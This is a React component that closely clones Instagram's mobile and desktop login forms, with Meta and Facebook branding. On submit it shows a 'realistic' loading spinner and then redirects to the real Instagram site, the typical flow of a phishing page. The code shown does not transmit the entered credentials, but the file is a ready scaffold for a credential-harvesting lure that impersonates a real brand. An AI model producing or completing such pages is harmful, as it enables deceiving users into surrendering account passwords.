import React, { useState } from 'react';
import { FacebookIcon, LoadingSpinner, MetaLogo, InstagramGradientIcon } from './Icons';

export const LoginForm = ({ isMobile = false }) => {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isIdentifierFocused, setIsIdentifierFocused] = useState(false);
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const isIdentifierFloating = isIdentifierFocused || identifier.length > 0;
  const isPasswordFloating = isPasswordFocused || password.length > 0;

  // Button enabled when both fields have content
  const isFormValid = identifier.trim().length > 0 && password.length > 0;

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;

    setIsLoading(true);

    // Brief realistic spinner, then route directly to real Instagram
    setTimeout(() => {
      window.location.href = 'https://www.instagram.com/';
    }, 800);
  };

  const handleFacebookLogin = (e) => {
    e.preventDefault();
    window.location.href = 'https://www.facebook.com/login.php';
  };

  const handleCreateAccount = (e) => {
    e.preventDefault();
    window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
  };

  if (isMobile) {
    return (
      <div className="w-full h-full flex flex-col justify-between py-2 max-w-[360px] mx-auto select-none">
        {/* Upper Section: Centered Logo */}
        <div className="w-full flex flex-col items-center pt-8 pb-10">
          <InstagramGradientIcon className="w-[68px] h-[68px]" />
        </div>

        {/* Middle Section: Form Inputs, Submit Button, Forgotten Password */}
        <div className="w-full flex flex-col">
          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3" noValidate>
            {/* Input 1: Username, email address or mobile number */}
            <div
              className={`relative w-full h-[56px] bg-[#ffffff] rounded-[14px] border transition-all duration-150 flex items-center ${
                isIdentifierFocused
                  ? 'border-[#0064e0] ring-1 ring-[#0064e0]'
                  : 'border-[#dbdbdb] hover:border-[#a8a8a8]'
              }`}
            >
              <label
                htmlFor="mobile-identifier"
                className={`absolute left-4 select-none pointer-events-none transition-all duration-150 ease-out text-[#737373] ${
                  isIdentifierFloating
                    ? 'top-[9px] text-[11px] font-normal tracking-tight'
                    : 'top-[17px] text-[14px]'
                }`}
              >
                Username, email address or mobile number
              </label>
              <input
                id="mobile-identifier"
                name="identifier"
                type="text"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                onFocus={() => setIsIdentifierFocused(true)}
                onBlur={() => setIsIdentifierFocused(false)}
                autoComplete="username"
                disabled={isLoading}
                required
                className={`w-full h-full bg-transparent px-4 text-[14px] text-[#000000] focus:outline-none ${
                  isIdentifierFloating ? 'pt-[18px] pb-[4px]' : 'py-3'
                }`}
              />
            </div>

            {/* Input 2: Password */}
            <div
              className={`relative w-full h-[56px] bg-[#ffffff] rounded-[14px] border transition-all duration-150 flex items-center ${
                isPasswordFocused
                  ? 'border-[#0064e0] ring-1 ring-[#0064e0]'
                  : 'border-[#dbdbdb] hover:border-[#a8a8a8]'
              }`}
            >
              <label
                htmlFor="mobile-password"
                className={`absolute left-4 select-none pointer-events-none transition-all duration-150 ease-out text-[#737373] ${
                  isPasswordFloating
                    ? 'top-[9px] text-[11px] font-normal tracking-tight'
                    : 'top-[17px] text-[14px]'
                }`}
              >
                Password
              </label>
              <input
                id="mobile-password"
                name="password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => setIsPasswordFocused(false)}
                autoComplete="current-password"
                disabled={isLoading}
                required
                className={`w-full h-full bg-transparent px-4 text-[14px] text-[#000000] focus:outline-none ${
                  password.length > 0 ? 'pr-14' : ''
                } ${isPasswordFloating ? 'pt-[18px] pb-[4px]' : 'py-3'}`}
              />

              {password.length > 0 && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  tabIndex={-1}
                  className="absolute right-4 text-[13px] font-semibold text-[#737373] hover:text-[#000000] transition-colors focus:outline-none select-none"
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              )}
            </div>

            {/* Log in Button */}
            <button
              type="submit"
              disabled={!isFormValid || isLoading}
              className={`w-full mt-1 h-[44px] rounded-full text-[14px] font-semibold flex items-center justify-center transition-all duration-200 ${
                isFormValid && !isLoading
                  ? 'bg-[#0064e0] hover:bg-[#1877f2] active:opacity-90 text-white cursor-pointer shadow-sm'
                  : 'bg-[#4cb5f9]/70 text-white/80 cursor-default'
              }`}
            >
              {isLoading ? (
                <LoadingSpinner className="w-5 h-5 text-white" />
              ) : (
                'Log in'
              )}
            </button>

            {/* Forgotten password? Link */}
            <div className="w-full text-center my-3">
              <a
                href="https://www.instagram.com/accounts/password/reset/"
                className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none"
              >
                Forgotten password?
              </a>
            </div>
          </form>
        </div>

        {/* Bottom Section: Create new account & Meta Logo */}
        <div className="w-full flex flex-col items-center mt-auto pt-10">
          <button
            type="button"
            onClick={handleCreateAccount}
            className="w-full h-[44px] rounded-full bg-transparent hover:bg-[#0064e0]/5 border border-[#0064e0] flex items-center justify-center text-[14px] font-semibold text-[#0064e0] hover:text-[#1877f2] transition-colors focus:outline-none cursor-pointer mb-3"
          >
            <span>Create new account</span>
          </button>
          <div className="flex justify-center items-center py-2">
            <MetaLogo />
          </div>
        </div>
      </div>
    );
  }

  // Desktop View Form
  return (
    <div className="w-full max-w-[390px] flex flex-col justify-center select-none">
      {/* Heading */}
      <h1 className="w-full text-[17px] font-semibold text-[#000000] tracking-normal mb-6 text-left">
        Log into Instagram
      </h1>

      {/* Form Container */}
      <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3" noValidate>
        {/* Input 1: Mobile number, username or email */}
        <div
          className={`relative w-full h-[56px] bg-[#ffffff] rounded-[14px] border transition-all duration-150 flex items-center ${
            isIdentifierFocused
              ? 'border-[#0064e0] ring-1 ring-[#0064e0]'
              : 'border-[#dbdbdb] hover:border-[#a8a8a8]'
          }`}
        >
          <label
            htmlFor="desktop-identifier"
            className={`absolute left-4 select-none pointer-events-none transition-all duration-150 ease-out text-[#737373] ${
              isIdentifierFloating
                ? 'top-[9px] text-[11px] font-normal tracking-tight'
                : 'top-[17px] text-[14px]'
            }`}
          >
            Mobile number, username or email
          </label>
          <input
            id="desktop-identifier"
            name="identifier"
            type="text"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            onFocus={() => setIsIdentifierFocused(true)}
            onBlur={() => setIsIdentifierFocused(false)}
            autoComplete="username"
            disabled={isLoading}
            required
            className={`w-full h-full bg-transparent px-4 text-[14px] text-[#000000] focus:outline-none ${
              isIdentifierFloating ? 'pt-[18px] pb-[4px]' : 'py-3'
            }`}
          />
        </div>

        {/* Input 2: Password */}
        <div
          className={`relative w-full h-[56px] bg-[#ffffff] rounded-[14px] border transition-all duration-150 flex items-center ${
            isPasswordFocused
              ? 'border-[#0064e0] ring-1 ring-[#0064e0]'
              : 'border-[#dbdbdb] hover:border-[#a8a8a8]'
          }`}
        >
          <label
            htmlFor="desktop-password"
            className={`absolute left-4 select-none pointer-events-none transition-all duration-150 ease-out text-[#737373] ${
              isPasswordFloating
                ? 'top-[9px] text-[11px] font-normal tracking-tight'
                : 'top-[17px] text-[14px]'
            }`}
          >
            Password
          </label>
          <input
            id="desktop-password"
            name="password"
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setIsPasswordFocused(true)}
            onBlur={() => setIsPasswordFocused(false)}
            autoComplete="current-password"
            disabled={isLoading}
            required
            className={`w-full h-full bg-transparent px-4 text-[14px] text-[#000000] focus:outline-none ${
              password.length > 0 ? 'pr-14' : ''
            } ${isPasswordFloating ? 'pt-[18px] pb-[4px]' : 'py-3'}`}
          />

          {password.length > 0 && (
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              tabIndex={-1}
              className="absolute right-4 text-[13px] font-semibold text-[#737373] hover:text-[#000000] transition-colors focus:outline-none select-none"
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          )}
        </div>

        {/* Primary Log in Button */}
        <button
          type="submit"
          disabled={!isFormValid || isLoading}
          className={`w-full mt-1 h-[44px] rounded-full text-[14px] font-semibold flex items-center justify-center transition-all duration-200 ${
            isFormValid && !isLoading
              ? 'bg-[#0064e0] hover:bg-[#1877f2] active:opacity-90 text-white cursor-pointer shadow-sm'
              : 'bg-[#4cb5f9]/70 text-white/80 cursor-default'
          }`}
        >
          {isLoading ? (
            <LoadingSpinner className="w-5 h-5 text-white" />
          ) : (
            'Log in'
          )}
        </button>

        {/* Forgotten password? Link */}
        <div className="w-full text-center my-3">
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none"
          >
            Forgotten password?
          </a>
        </div>

        {/* Log in with Facebook Button */}
        <button
          type="button"
          onClick={handleFacebookLogin}
          className="w-full h-[44px] rounded-full bg-[#f0f2f5] hover:bg-[#e4e6eb] border border-[#dbdbdb] flex items-center justify-center gap-2.5 text-[14px] font-semibold text-[#000000] transition-colors focus:outline-none cursor-pointer"
        >
          <FacebookIcon className="w-5 h-5 text-[#1877f2]" />
          <span>Log in with Facebook</span>
        </button>

        {/* Create new account Button */}
        <button
          type="button"
          onClick={handleCreateAccount}
          className="w-full h-[44px] rounded-full bg-transparent hover:bg-[#0064e0]/5 border border-[#0064e0] flex items-center justify-center text-[14px] font-semibold text-[#0064e0] hover:text-[#1877f2] transition-colors focus:outline-none cursor-pointer mt-1"
        >
          <span>Create new account</span>
        </button>
      </form>

      {/* Meta Logo */}
      <div className="mt-8 flex justify-center items-center">
        <MetaLogo />
      </div>
    </div>
  );
};
